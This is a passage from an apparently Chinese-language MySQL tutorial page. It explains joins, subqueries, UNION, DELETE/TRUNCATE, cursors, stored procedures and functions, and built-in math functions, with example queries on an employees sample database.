dept_manager <span class="keyword">join</span> departments <span class="keyword">using</span>(dept_no);</span><br></pre></td></tr></table></figure><p><img src="./image-20220228161443815.png" alt="image-20220228161443815"></p><p>自连接：一个表的两个副本之间的内连接。同一个表名在from子句中出现两次，故为了区别，必须对表指定不同的别名，字段名前也要加上表的别名进行限定，想不到什么实际应用场景。</p><h5><span id="外连接">外连接</span></h5><p>外连接有主从表之分同时只适用于两个表。</p><p>(3) left 或 left outer join : 左外连接，即左表为主表，将左表所有数据行与右表中的每一行按连接条件进行匹配，结果包含左标的所有数据行。左表与右表没有相匹配的行，则在结果集中右表字段都以NULL或0来填充。</p><p>(4) right join 或 right outer join: 右外连接，即右表为主表，将右表所有数据行与左表中的每一行按连接条件进行匹配，结果包含右标的所有数据行。左表与右表没有相匹配的行，则在结果集中左表字段都以NULL或0来填充。</p><p>(5) full join 或 full outer join: 完全连接，结果集包含两个连接表的所有数据行，两个表没有数据则用NULL或0来填充。</p><h4><span id="子查询">子查询</span></h4><p>子查询是将一个select语句嵌套在另一个select语句的where子句中的查询。子查询也可以嵌套在insert、update、delete语句中。</p><p>应注意如下两点</p><p>(1) 使用圆括号将子查询的select语句括起来</p><p>(2) 当子查询返回值为单个值时，子查询可以应用到任何表达式中。</p><p>子查询分别是比较子查询，IN子查询，批量比较子查询和EXISTS子查询。</p><h5><span id="比较子查询">比较子查询</span></h5><p>使用比较子查询,得出emp_no=’10001’所住公寓的公寓名.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name <span class="keyword">from</span> departments <span class="keyword">where</span> dept_no=(<span class="keyword">select</span> dept_no <span class="keyword">from</span> dept_emp <span class="keyword">where</span> emp_no=<span class="string">'10001'</span>);</span><br></pre></td></tr></table></figure><p><img src="./image-20220228201547872.png" alt="image-20220228201547872"></p><h5><span id="in子查询">IN子查询</span></h5><p>父查询与子查询之间用IN或NOT IN进行连接并判断某个字段的值是否在子查询查找到的集合中.    </p><p>例如姓氏为Fei名字为B开头的人在就职期间的最高薪水,显示emp_no,first_name,last_name和max(salary)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> emp_no,first_name,last_name,<span class="keyword">max</span>(salary) <span class="keyword">from</span> salaries <span class="keyword">natural</span> <span class="keyword">join</span> employees <span class="keyword">where</span> emp_no <span class="keyword">in</span> (<span class="keyword">select</span> emp_no <span class="keyword">from</span>  employees <span class="keyword">where</span> first_name =<span class="string">"Fei"</span> <span class="keyword">and</span> last_name <span class="keyword">like</span> <span class="string">"B%"</span>) <span class="keyword">group</span> <span class="keyword">by</span> emp_no,first_name,last_name;</span><br></pre></td></tr></table></figure><p><img src="./image-20220228203114714.png" alt="image-20220228203114714"></p><h5><span id="批量比较子查询">批量比较子查询</span></h5><p>在子查询结果不止一个时候，父查询和子查询之间需要比较运算符进行连接。这个时候就需要子查询前面加上ANY或者ALL.</p><p>ANY:在子查询前面使用ANY时，会使用指定的比较运算符将一个表达式的值或字段的值与每一个子查询返回值进行比较，只要有一次比较的结果为TRUE，则整个表达式的值为TRUE，否则为FALSE；</p><p>例如显示薪水大于155513的员工信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees <span class="keyword">where</span> emp_no = <span class="keyword">ANY</span>(<span class="keyword">select</span> emp_no <span class="keyword">from</span> salaries <span class="keyword">where</span> salary&gt;=<span class="number">155513</span>);</span><br></pre></td></tr></table></figure><p><img src="./image-20220301153526594.png" alt="image-20220301153526594"></p><p>怎么理解呢，使用ANY字段就类似于IN字段，只要emp_no的条件在子查询的结果里面，成立一条或多条该结果就满足where比较条件。</p><p>ALL：指定比较运算符将一个表达式的值或者字段的值与每一个子查询返回值进行比较，只有当所有比较的结果都为TRUE时，整个表达式的值才为TRUE，否则为FALSE；</p><h5><span id="exists子查询not-exists">EXISTS子查询/NOT EXISTS</span></h5><p>对于子查询结果判断是否为空，如果子查询结果为空，则返回FALSE，否则返回TRUE。</p><p>NOT EXISTS则相反。</p><p>例如薪水大于158220的信息存在则输出公寓信息表。</p><p><img src="./image-20220301161418910.png" alt="image-20220301161418910"></p><h4><span id="子查询与多表查询的选择">子查询与多表查询的选择</span></h4><p>（1）当输出信息来自多个表时候，选择连接查询。</p><p>（2）当查询语句输出信息来自一张表时，但是限制条件来自另一张表，使用子查询。</p><p>（3）查询输出信息和where子句都只涉及一张表，到那时查询条件涉及集合函数数值比较，一般使用子查询。例如输出分数表分数低于平均成绩的分数信息。</p><h4><span id="union合并结果集">UNION合并结果集</span></h4><p>指对多个select语句查询的结果集进行合并操作，组成一个结果集。</p><p>（1）所有select语句中字段个数必须相同</p><p>（2）所有select语句中数据类型必须相同或者兼容</p><p>（3）合并后的结果集字段名是第一个select语句中的字段名，如果要指定别名也只能在第一个select语句中指定。</p><p>（4）每一个select语句本身不能包含order by。只能在最后一个使用order by 排序且必须使用第一个select语句中的字段名。</p><p>例如输出所有演员和员工的姓氏为’F’开头的姓氏和姓名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> first_name <span class="keyword">as</span> 姓氏,last_name <span class="keyword">as</span> 名字  <span class="keyword">from</span> customer <span class="keyword">where</span> first_name <span class="keyword">like</span> <span class="string">'F%'</span> <span class="keyword">union</span> <span class="keyword">select</span> first_name, last_name <span class="keyword">from</span> actor <span class="keyword">where</span> first_name <span class="keyword">like</span> <span class="string">'F%'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220301164753093.png" alt="image-20220301164753093"></p><h3><span id="删除">删除</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [<span class="keyword">from</span>] 表名 [<span class="keyword">where</span> 条件表达式]</span><br></pre></td></tr></table></figure><p>使用删除语句时，不写where条件限制，则表示要清空指定数据表。</p><p>清空数据表第二种办法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">truncate</span> 表名;</span><br></pre></td></tr></table></figure><p>delete为dml语句  truncate为DDL语句</p><h2><span id="存储过程和函数">存储过程和函数</span></h2><h3><span id="mysql-程序设计">Mysql 程序设计</span></h3><h4><span id="1-局部变量">(1) 局部变量</span></h4><p>常用于存储过程和存储函数的BEGIN和END语句块之间。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> 变量名 变量类型 [<span class="keyword">DEFAULT</span> 默认值];</span><br></pre></td></tr></table></figure><p>默认值不指定则局部变量初始为NULL,若指定则局部变量初始值为默认值.</p><p>变量赋值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> 声明的变量名=赋值;</span><br></pre></td></tr></table></figure><p>自定义变量名</p><p>可以不用直接声明变量,直接使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @变量名=值;</span><br></pre></td></tr></table></figure><p>这种直接声明用户自定义变量并且赋值.</p><p>查看自定义变量值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @变量名<span class="number">1</span>，@变量名<span class="number">2</span>;</span><br></pre></td></tr></table></figure><h4><span id="2-流程控制语句">(2) 流程控制语句</span></h4><p>IF、CASE、LOOP、WHILE、ITERATE、REPEAT。</p><h5><span id="if用法">IF用法：</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IF 条件表达式 THEN 执行语句</span><br><span class="line">[ELSEIF 条件表达式 THEN 执行语句]</span><br><span class="line">[ELSE　执行语句]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br></pre></td></tr></table></figure><h5><span id="case用法">CASE用法：</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CASE 判断变量</span><br><span class="line">WHEN 判断变量值1 THEN 执行语句</span><br><span class="line">[WHEN 判断变量值2 THEN 执行语句]</span><br><span class="line">[ELSE 执行语句]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br></pre></td></tr></table></figure><h5><span id="loop用法">LOOP用法：</span></h5><p>死循环</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[循环标签:] LOOP </span><br><span class="line">执行语句</span><br><span class="line">[LEAVE 循环标签]//离开循环</span><br><span class="line">[ITERATE 循环标签]//结束本次循环，开始下次循环</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">LOOP</span> [循环标签];</span><br></pre></td></tr></table></figure><h5><span id="repeat用法">REPEAT用法：</span></h5><p>相当于C语言里面do while</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[循环标签:] REPEAT</span><br><span class="line">执行语句</span><br><span class="line">[LEAVE 循环标签]//离开循环</span><br><span class="line">[ITERATE 循环标签]//结束本次循环，开始下次循环</span><br><span class="line">UNTIL 循环条件表达式</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">REPEAT</span> [循环标签];</span><br></pre></td></tr></table></figure><h5><span id="while用法">WHILE用法：</span></h5><p>相当于C语言里面的WHILE</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[循环标签:] WHILE 循环条件表达式 <span class="keyword">DO</span></span><br><span class="line">执行语句</span><br><span class="line">[LEAVE 循环标签]//离开循环</span><br><span class="line">[<span class="keyword">ITERATE</span> 循环标签]//结束本次循环，开始下次循环</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">WHILE</span> [循环标签];</span><br></pre></td></tr></table></figure><h4><span id="3-光标">(3) 光标</span></h4><p>用在BEGIN和END之间，用于mysql程序设计</p><p>使用sql语句对数据表查询时，可能返回多条结果，如果对查询结果集中的多条进行逐条读取，则需使用光标。</p><h5><span id="光标声明">光标声明</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> 光标名 <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> 查询<span class="keyword">sql</span>语句;</span><br></pre></td></tr></table></figure><h5><span id="光标使用">光标使用</span></h5><p>光标使用之前必须先打开，从光标查询结果中取出一条记录可用FETCH语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OPEN 光标名</span><br><span class="line">FETCH 光标名 INTO 声明的变量名1,声明的变量名2,声明的变量名3,......;</span><br></pre></td></tr></table></figure><h5><span id="关闭光标">关闭光标</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close 光标名;</span><br></pre></td></tr></table></figure><h3><span id="存储程序">存储程序</span></h3><p>存储过程: 数据库服务器上一组<strong>预先编译好的</strong>sql语句的集合，作为一个对象存储在数据库中，可以作为一个整体来被调用,并不返回结果.</p><p>存储函数: 调用过程中可以从调用者哪里获得参数，执行完毕之后返回给调用者一个返回值，类似于C语言中的函数。</p><p>触发器: 更新,删除,插入表数据时,引发与之关联的触发器自动执行.</p><p>事件: 事件时根据时间调度器在预定时间自动执行的存储程序.</p><h4><span id="存储过程">存储过程</span></h4><p>存储过程的优势:</p><p>① 提高设计灵活性</p><p>② 模块化</p><p>③ 因为提前编译,提高程序执行速度</p><p>④ 减少网络访问负荷</p><p>⑤ 可以对数据进行访问权限限制</p><h5><span id="创建存储过程">创建存储过程</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> 存储过程名([<span class="keyword">IN</span>/<span class="keyword">OUT</span>/INOUT 参数名<span class="number">1</span> 数据类型,<span class="keyword">IN</span>/<span class="keyword">OUT</span>/INOUT 参数名<span class="number">1</span> 数据类型]) [characteristic]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">MYSQL语句;</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER //</span><br></pre></td></tr></table></figure><p>可将结束符”;”修改为”//“</p><p>例子1:创建一个存储过程,参数为员工编号,使用局部变量用来显示员工编号对应的姓氏和姓名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> <span class="string">`ShowName`</span>(<span class="keyword">IN</span> emp_no <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> var_first_name <span class="built_in">VARCHAR</span>(<span class="number">14</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> var_last_name <span class="built_in">VARCHAR</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">select</span> first_name,last_name <span class="keyword">into</span> var_first_name,var_last_name <span class="keyword">from</span> employees <span class="keyword">where</span> employees.emp_no=emp_no;</span><br><span class="line"><span class="keyword">select</span> var_first_name,var_last_name;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220302191350337.png" alt="image-20220302191350337"></p><p>例子2:创建一个存储过程,使用游标来存储姓氏Aamod和名字为 Mandell的薪水表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> FirstSalary()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="comment">#Routine body goes here...</span></span><br><span class="line"><span class="keyword">DECLARE</span> done <span class="built_in">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>; </span><br><span class="line"><span class="keyword">DECLARE</span> var_emp_no <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> cursor_emp_no <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> </span><br><span class="line"><span class="keyword">SELECT</span> emp_no <span class="keyword">from</span> employees <span class="keyword">where</span> first_name <span class="keyword">like</span> <span class="string">'Aamod'</span> <span class="keyword">and</span> last_name <span class="keyword">like</span> <span class="string">'Mandell'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE <span class="keyword">HANDLER</span> <span class="keyword">FOR</span> <span class="keyword">NOT</span> <span class="keyword">FOUND</span> <span class="keyword">SET</span> done=<span class="number">1</span>; </span><br><span class="line">OPEN cursor_emp_no;</span><br><span class="line"></span><br><span class="line">WHILE done!=1 <span class="keyword">DO</span></span><br><span class="line"><span class="keyword">fetch</span> cursor_emp_no <span class="keyword">into</span> var_emp_no;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=var_emp_no;</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">while</span>;</span><br><span class="line"></span><br><span class="line">close cursor_emp_no;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305201205048.png" alt="image-20220305201205048"></p><h6><span id="创建调用带参数的存储过程的存储过程">创建调用带参数的存储过程的存储过程</span></h6><p>在存储过程中，调用带参数的存储过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> 存储过程名(参数<span class="number">1</span>, 参数<span class="number">2</span>);<span class="comment">#参数为变量或者常量</span></span><br></pre></td></tr></table></figure><p>例如调用存储过程ShowName</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> CallProcedure()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SET</span> @emp_no=<span class="number">10001</span>;</span><br><span class="line"><span class="keyword">call</span> ShowName(@emp_no);</span><br><span class="line"><span class="keyword">call</span> ShowName(<span class="number">10009</span>);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305201417197.png" alt="image-20220305201417197"></p><h6><span id="创建带输出参数的存储过程">创建带输出参数的存储过程</span></h6><p>例如创建存储过程，用参数传入工号，用参数返回最新工资。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> ShowSalary(<span class="keyword">IN</span> para_emp_no <span class="built_in">int</span>,<span class="keyword">OUT</span> para_salary <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> salary <span class="keyword">into</span> para_salary <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=para_emp_no <span class="keyword">and</span> from_date=(<span class="keyword">select</span> <span class="keyword">Max</span>(from_date) <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=para_emp_no);</span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><h5><span id="管理存储过程">管理存储过程</span></h5><h6><span id="查看存储过程">查看存储过程</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> mysql.proc <span class="keyword">where</span> db=<span class="string">'数据库名'</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">select</span> routine_name <span class="keyword">from</span> information_schema.ROUTINES <span class="keyword">where</span> routine_schema=<span class="string">'数据库名'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305204418312.png" alt="image-20220305204418312"></p><p><img src="./image-20220305204440880.png" alt="image-20220305204440880"></p><p>查看所有存储过程信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">PROCEDURE</span> <span class="keyword">status</span> <span class="keyword">where</span> db=<span class="string">'数据库名'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305210041852.png" alt="image-20220305210041852"></p><p>查看存储过程详细信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">procedure</span> 存储函数名;</span><br></pre></td></tr></table></figure><h6><span id="修改存储过程">修改存储过程</span></h6><p>如下语法只能修改存储过程特性，如要修改内容，则需删除后重新创建。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">PROCEDURE</span> 存储过程名 [characteristic....];</span><br></pre></td></tr></table></figure><p><strong>characteristic</strong>如下</p><p><em>LANGUAGE SQL</em> ：说明routine_body部分是由SQL语句组成的，当前系统支持的语言为SQL，SQL是LANGUAGE特性的唯一值</p><p><em>[NOT] DETERMINISTIC</em> ：指明存储过程执行的结果是否正确。DETERMINISTIC 表示结果是确定的。每次执行存储过程时，相同的输入会得到相同的输出。</p><p>[NOT] DETERMINISTIC 表示结果是不确定的，相同的输入可能得到不同的输出。如果没有指定任意一个值，默认为[NOT] DETERMINISTIC</p><p><em>CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA</em>：指明子程序使用SQL语句的限制。</p><p>​    CONTAINS SQL：表明子程序包含SQL语句，但是不包含读写数据的语句；</p><p>​    NO SQL：表明子程序不包含SQL语句；</p><p>​    READS SQL DATA：说明子程序包含读数据的语句；</p><p>​    MODIFIES SQL DATA：表明子程序包含写数据的语句。</p><p>默认情况下，系统会指定为CONTAINS SQL</p><p><em>SQL SECURITY { DEFINER | INVOKER }</em> ：指明谁有权限来执行。DEFINER 表示只有定义者才能执行</p><p>​    INVOKER：表示拥有权限的调用者可以执行。默认情况下，系统指定为DEFINER</p><p>​    COMMENT ‘string’ ：注释信息，可以用来描述存储过程或函数</p><p>例如修改ShowName的存储过程信息为 MODIFIES SQL DATA以及 SQL SECURITY INVOKER</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">PROCEDURE</span> ShowName MODIFIES <span class="keyword">SQL</span> <span class="keyword">DATA</span> <span class="keyword">SQL</span> <span class="keyword">SECURITY</span> INVOKER;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305211455653.png" alt="image-20220305211455653"></p><h6><span id="删除存储过程">删除存储过程</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> <span class="string">'存储过程名'</span></span><br></pre></td></tr></table></figure><h4><span id="存储函数">存储函数</span></h4><h5><span id="创建存储函数">创建存储函数</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">FUNCTION</span> 函数名([参数<span class="number">1</span>,参数<span class="number">2</span>,....]) <span class="keyword">return</span> 返回类型 [characteristic]</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">函数体</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p>例如比较两个工号最近工资多少</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> CompareSalary(emp_no1 <span class="built_in">int</span>,emp_no2 <span class="built_in">int</span>) <span class="keyword">RETURNS</span> <span class="built_in">int</span>(<span class="number">11</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> salary1 <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> salary2 <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">select</span> salary <span class="keyword">into</span> salary1 <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=emp_no1 <span class="keyword">and</span> from_date=(<span class="keyword">select</span> <span class="keyword">Max</span>(from_date) <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=emp_no1);</span><br><span class="line"><span class="keyword">select</span> salary <span class="keyword">into</span> salary2 <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=emp_no2 <span class="keyword">and</span> from_date=(<span class="keyword">select</span> <span class="keyword">Max</span>(from_date) <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=emp_no2);</span><br><span class="line">if salary1&gt;=salary2 then</span><br><span class="line">RETURN salary1;</span><br><span class="line">else</span><br><span class="line">RETURN salary2;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220305214918006.png" alt="image-20220305214918006"></p><h5><span id="查看存储函数">查看存储函数</span></h5><p>和存储过程一样。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> mysql.proc <span class="keyword">where</span> db=<span class="string">'数据库名'</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">select</span> routine_name <span class="keyword">from</span> information_schema.ROUTINES <span class="keyword">where</span> routine_schema=<span class="string">'数据库名'</span>;</span><br></pre></td></tr></table></figure><p>查看存储函数详细信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">function</span> 存储函数名;</span><br></pre></td></tr></table></figure><p>查看数据库中所有存储函数信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">function</span> <span class="keyword">status</span> <span class="keyword">where</span> db=<span class="string">'数据库名'</span></span><br></pre></td></tr></table></figure><h5><span id="修改存储函数">修改存储函数</span></h5><p>和存储过程一样 就需要把procedure改为function.</p><h5><span id="删除存储函数">删除存储函数</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> 存储函数名;</span><br></pre></td></tr></table></figure><h5><span id="可以直接使用的数学存储函数">可以直接使用的数学存储函数</span></h5><ul><li><p><code>-</code>元减：改变参数的符号</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT - <span class="number">2</span>; -&gt; <span class="number">-2</span></span><br></pre></td></tr></table></figure><p>注意，如果这个操作符被用于一个 <code>BIGINT</code>，返回值也是一个 <code>BIGINT</code>！这就意味着，应该避免在一个可能有值<code>-2^63</code> 的整数上使用 <code>-</code> 操作符！</p></li><li><p><code>ABS(X)</code>：返回 <code>X</code> 的绝对值：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">2</span>); -&gt; 2 mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">-32</span>); -&gt; 32</span><br></pre></td></tr></table></figure><p>这个函数可安全地使用于 <code>BIGINT</code> 值。</p></li><li><p><code>SIGN(X)</code>：以 <code>-1</code>、<code>0</code> 或 <code>1</code> 方式返回参数的符号，它取决于参数 <code>X</code> 是负数、0 或正数。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SIGN</span>(<span class="number">-32</span>); -&gt; -1 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SIGN</span>(<span class="number">0</span>); -&gt; 0 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SIGN</span>(<span class="number">234</span>); -&gt; 1</span><br></pre></td></tr></table></figure></li><li><p><code>MOD(N,M)</code>：% 取模 (就如 C 中的 <code>%</code> 操作符)。返回 <code>N</code> 被 <code>M</code> 除后的余数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="number">253</span> % <span class="number">7</span>; -&gt; <span class="number">1</span> </span><br><span class="line">mysql&gt; SELECT MOD(<span class="number">29</span>,<span class="number">9</span>); -&gt; <span class="number">2</span> </span><br><span class="line">mysql&gt; SELECT <span class="number">29</span> MOD <span class="number">9</span>; -&gt; <span class="number">2</span></span><br></pre></td></tr></table></figure><p>这个函数可安全地使用于 <code>BIGINT</code> 值。最后一个示例可在 MySQL 4.1 中工作。</p></li><li><p><code>FLOOR(X)</code>：返回不大于 <code>X</code> 的最大整数值</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 